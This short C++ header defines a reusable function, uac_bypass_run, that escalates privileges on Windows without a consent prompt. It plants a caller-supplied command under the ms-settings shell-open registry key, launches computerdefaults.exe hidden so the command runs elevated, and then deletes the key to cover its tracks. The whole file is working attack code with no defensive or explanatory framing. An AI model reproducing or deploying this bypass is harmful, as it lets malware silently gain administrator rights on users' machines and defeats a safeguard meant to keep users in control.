#pragma once
#include <windows.h>
#include <shellapi.h>
#include <string>

inline bool uac_bypass_run(const std::wstring& payload){
    HKEY k;
    if(RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\Open\\command",
        0, nullptr, 0, KEY_WRITE, nullptr, &k, nullptr) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(k, nullptr, 0, REG_SZ, (BYTE*)payload.c_str(),
                   (DWORD)((payload.size()+1)*sizeof(wchar_t)));
    const wchar_t* empty = L"";
    RegSetValueExW(k, L"DelegateExecute", 0, REG_SZ,
                   (BYTE*)empty, sizeof(wchar_t));
    RegCloseKey(k);

    ShellExecuteW(nullptr, L"open", L"computerdefaults.exe",
                  nullptr, nullptr, SW_HIDE);
    Sleep(2500);
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    return true;
}